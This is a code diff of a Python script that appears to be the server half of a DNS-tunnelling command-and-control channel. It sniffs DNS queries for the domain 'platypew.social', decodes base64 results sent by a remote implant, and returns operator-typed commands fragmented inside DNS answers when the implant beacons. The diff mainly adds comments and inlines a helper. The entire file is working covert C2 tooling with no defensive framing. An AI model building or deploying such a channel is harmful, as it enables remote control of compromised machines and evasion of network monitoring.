@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from scapy.all import *
+from scapy.all import IP, UDP, DNS, DNSRR, send, sniff
 from base64 import b64encode, b64decode
 
 import threading
@@ -10,11 +10,12 @@ DOMAIN = "platypew.social"
 
 FRAG_LEN = 70 - len(DOMAIN)
 
-recv = b""
-queue = []
-buf = []
+recv = b""  # Buffer of received data to process
+queue = []  # List of commands to run
+buf = []  # Break commands to send into smaller fragmented pieces
 
 
+# Decode base64
 def decode(data: bytes) -> bytes:
     data = b64decode(recv)
     return data
@@ -27,9 +28,11 @@ def reply(pkt, data=False) -> None:
     # Consturct the UDP header
     udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
 
+    # Check if data is pulse or not
     if data is False:
         data = pkt[DNS].qd.qname
 
+    # Mark as last packet
     z = 0
     if buf == []:
         z = 1
@@ -42,9 +45,11 @@ def reply(pkt, data=False) -> None:
               z=z,
               an=DNSRR(rrname=data, type='A', ttl=600, rdata=PUBLIC_IP))
 
+    # Send the data
     send(ip / udp / dns, iface=IFACE, verbose=False)
 
 
+# Encodes into base64 and fragments data into smaller pieces
 def encode(data: bytes) -> list:
     data = data.strip()
     e_data = b64encode(data).decode()
@@ -52,15 +57,9 @@ def encode(data: bytes) -> list:
     return frag_e_data
 
 
-def fragment():
-    global queue
-    global buf
-
-    if buf == [] and queue != []:
-        buf = encode(queue.pop(0))
-
-
+# Handle packets that come in
 def pkt_callback(pkt) -> None:
+    global queue
     global recv
     global buf
 
@@ -71,21 +70,28 @@ def pkt_callback(pkt) -> None:
     if data != b"pulse":
         recv += data
 
+        # Check if last packet
         if pkt[DNS].z == 1:
             try:
                 print(decode(recv).decode())
             except:
+                # UDP may lose data, oh wells...
                 print("Data got corrupted!")
             recv = b""
 
         reply(pkt)
     else:
-        fragment()
-        if buf != []:
+        # Fragment the commands to be sent if it's too long
+        if buf == [] and queue != []:
+            buf = encode(queue.pop(0))
+
+        if buf != []:  # Check if there are any more commands left to send
             reply(pkt, buf.pop(0) + f".{DOMAIN}")
-        else:
+        else:  # Continue with pulse
             reply(pkt)
 
+
+# Handle user input
 def user_input():
     while True:
         queue.append(input().encode())
@@ -93,6 +99,8 @@ def user_input():
 
 def main():
     threading.Thread(target=user_input).start()
+
+    # Sniff dns packets
     sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)
 
 
